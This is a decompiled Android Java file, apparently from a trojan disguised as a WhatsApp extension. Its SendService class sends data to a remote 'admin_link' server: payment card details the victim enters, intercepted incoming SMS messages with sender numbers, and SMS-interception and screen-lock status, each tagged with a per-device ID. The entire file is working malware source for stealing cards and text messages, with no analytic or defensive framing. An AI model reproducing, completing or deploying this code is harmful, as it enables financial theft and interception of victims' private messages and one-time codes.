package exts.whats;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import exts.whats.utils.RequestFactory;
import exts.whats.utils.Sender;
import exts.whats.utils.Utils;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONObject;

public class SendService extends IntentService {
    public static final String REPORT_CARD_DATA = "REPORT_CARD_DATA";
    public static final String REPORT_INCOMING_MESSAGE = "REPORT_INCOMING_MESSAGE";
    public static final String REPORT_INTERCEPT_STATUS = "REPORT_INTERCEPT_STATUS";
    public static final String REPORT_LOCK_STATUS = "REPORT_LOCK_STATUS";
    public static final String REPORT_SAVED_ID = "REPORT_SAVED_KEY";
    public static final String UPDATE_CARDS_UI = "UPDATE_CARDS_UI";
    private static SharedPreferences settings;
    private DefaultHttpClient httpClient;

    public SendService() {
        super("ReportService");
    }

    public void onCreate() {
        super.onCreate();
        settings = getSharedPreferences(Constants.PREFS_NAME, 0);
        this.httpClient = new DefaultHttpClient();
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        String action = intent.getAction();
        String appId = settings.getString(Constants.APP_ID, "-1");
        String adminLink = getString(R.string.admin_link);
        Intent updateCardUIIntent;
        try {
            if (action.equals(REPORT_SAVED_ID)) {
                Sender.request(this.httpClient, adminLink, RequestFactory.makeIdSavedConfirm(appId).toString());
            } else if (action.equals(REPORT_INCOMING_MESSAGE)) {
                Sender.request(this.httpClient, adminLink, RequestFactory.makeIncomingMessage(appId, intent.getStringExtra("number"), intent.getStringExtra("text")).toString());
            } else if (action.equals(REPORT_LOCK_STATUS)) {
                Sender.request(this.httpClient, adminLink, RequestFactory.makeLockStatus(appId, settings.getBoolean(Constants.LOCK_ENABLED, false)).toString());
            } else if (action.equals(REPORT_INTERCEPT_STATUS)) {
                Sender.request(this.httpClient, adminLink, RequestFactory.makeInterceptConfirm(appId, settings.getBoolean(Constants.INTERCEPTING_ENABLED, false)).toString());
            } else if (action.equals(REPORT_CARD_DATA)) {
                Sender.request(this.httpClient, adminLink, RequestFactory.makeCardData(appId, new JSONObject(intent.getStringExtra("data"))).toString());
                Utils.putBoolVal(settings, Constants.CARD_SENT, true);
                updateCardUIIntent = new Intent(UPDATE_CARDS_UI);
                updateCardUIIntent.putExtra("status", true);
                sendBroadcast(updateCardUIIntent);
            }
        } catch (Exception e) {
            if (action.equals(REPORT_CARD_DATA)) {
                updateCardUIIntent = new Intent(UPDATE_CARDS_UI);
                updateCardUIIntent.putExtra("status", false);
                sendBroadcast(updateCardUIIntent);
            }
            e.printStackTrace();
        }
    }
}
